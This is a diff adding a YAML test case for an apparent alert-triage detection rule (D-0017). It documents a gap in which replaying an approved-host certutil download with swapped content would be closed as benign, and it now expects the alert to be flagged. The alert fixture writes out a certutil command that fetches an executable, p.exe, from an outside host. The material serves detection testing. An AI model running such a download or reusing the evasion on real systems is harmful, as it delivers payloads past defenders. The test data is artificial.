@@ -1,0 +1,21 @@
+detection: D-0017
+name: 'round 9 hole: D-0017 step 4, yes Q-0014+Q-0017: an attacker who satisfies these answers no longer closes'
+reason: Before round 9 this closed as close:benign_true_positive:activity_baselined_on_host (D-0017@v6:1:Q-0000=no > 2:Q-0001=no > 3:Q-0017=yes > 4:Q-0014=yes). probable routine download from an approved
+  host; replaying the routine command with swapped content on an approved host is not visible here; verify the downloaded file
+mode: recommend
+overrides:
+  Q-0001: false
+  Q-0017: true
+  Q-0014: 5
+alert:
+  host.name: ws-18
+  user.name: jdoe
+  process.name: certutil.exe
+  process.parent_name: cmd.exe
+  process.sha256: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+  process.command_line: certutil -urlcache -split -f https://pkg.corp.example/ca.crt C:\ProgramData\ca.crt https://cdn-dl.example.net/p.exe C:\ProgramData\p.exe
+  event.time: '2026-10-17T08:00:00Z'
+  severity: medium
+expect:
+  outcome: flag
+order: 68
